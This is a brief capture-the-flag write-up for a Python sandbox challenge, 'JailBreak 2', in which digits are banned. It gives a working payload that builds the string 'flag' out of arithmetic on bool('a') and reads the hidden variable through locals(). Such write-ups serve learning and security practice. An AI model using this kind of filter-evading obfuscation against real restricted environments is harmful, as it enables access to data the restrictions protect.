# JailBreak 2

Unlike the first JailBreak, this time the security measures banned numbers. However, this does not factor into the fact the both `True` and `False` are counted as 1 and 0 respectedly. Using the `bool` function, which when presented with a not empty argument evaluates to true, we can then do math to get the the needed ascii values, counting the `bool("a")` as 1.

```
locals()[chr(((bool("a")+bool("a")+bool("a")+bool("a")+bool("a"))*(bool("a")+bool("a")))**(bool("a")+bool("a"))+bool("a")+bool("a"))+chr(((bool("a")+bool("a")+bool("a")+bool("a")+bool("a"))*(bool("a")+bool("a")))**(bool("a")+bool("a"))+(bool("a")+bool("a")+bool("a")+bool("a"))*(bool("a")+bool("a")))+chr(((bool("a")+bool("a")+bool("a")+bool("a")+bool("a"))*(bool("a")+bool("a")))**(bool("a")+bool("a"))-bool("a")-bool("a")-bool("a"))+chr(((bool("a")+bool("a")+bool("a")+bool("a")+bool("a"))*(bool("a")+bool("a")))**(bool("a")+bool("a"))+bool("a")+bool("a")+bool("a"))]
```